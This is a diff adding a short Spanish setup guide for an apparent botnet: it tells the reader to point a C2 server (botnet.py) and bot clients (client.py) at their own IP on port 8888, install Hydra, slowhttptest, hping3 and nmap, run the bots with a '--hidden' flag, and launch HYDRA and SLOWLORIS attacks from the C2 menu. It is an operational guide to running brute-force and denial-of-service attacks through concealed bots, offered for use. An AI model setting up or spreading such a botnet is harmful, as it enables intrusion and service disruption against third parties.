@@ -1,0 +1,31 @@
+1. Configura las direcciones
+
+En botnet.py, ajusta:
+
+HOST = 'TU_IP'
+PORT = 8888
+
+En client.py, ajusta:
+
+C2_SERVER = 'TU_IP'
+C2_PORT   = 8888
+
+2. Instala dependencias
+
+pip install -r requirements.txt
+
+(Opcional) Instala herramientas del sistema
+
+Hydra, Slowloris (slowhttptest), hping3, nmap…
+
+3. Arranca el servidor C2
+
+python botnet.py
+
+Arranca los clientes/bots
+
+python client.py --hidden
+
+4. Envía comandos y consulta resultados
+
+Desde el menú del C2 (botnet.py), elige “1” para enviar ataques (HYDRA, SLOWLORIS, etc.).
